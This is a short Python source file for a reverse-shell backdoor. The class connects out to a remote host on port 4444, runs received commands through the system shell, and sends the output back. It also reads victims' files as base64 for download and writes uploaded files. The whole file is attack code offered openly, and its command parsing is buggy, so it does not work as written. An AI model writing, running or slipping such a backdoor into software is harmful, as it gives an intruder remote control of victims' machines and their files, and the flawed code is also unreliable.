import socket
import subprocess
import os
import base64

class Backdoor(object):
    def __init__(self,ip):
        self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,4444))
        self.connection.send('\n[+] Connection Established.\n')
    def execute_command(self,command):
        try:
            return subprocess.check_output(command,shell=True)
        except subprocess.CalledProcessError:
            return "error during command execution"
    def change_dir(self,path):
        os.chdir(path)
        return "[+] Changing Dir to: ",path
    def read_file(self,path):
        with open(path,'rb') as file:
            return base64.b64encode(file.read())
    def write_file(self,path,content):
        with open(path,'w') as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful"
    def run(self):
        try:
            while True:
                command=self.connection.recv(1024)
                if command=='exit':
                    self.connection.close()
                elif command[0]=='download' and len(command)>1:
                    command_result=self.read_file(command[1])
                elif command[0]=='cd' and len(command) > 1 :
                    command_result=self.change_dir(command[1])
                elif command[0]=='upload':
                    command_result=self.write_file(command[1],command[2])
                command_result=self.execute_command(command)
                self.connection.send(command_result)
        except Exception:
            command_result='Error'
if __name__=='__main__':
    Backdoor('test').run()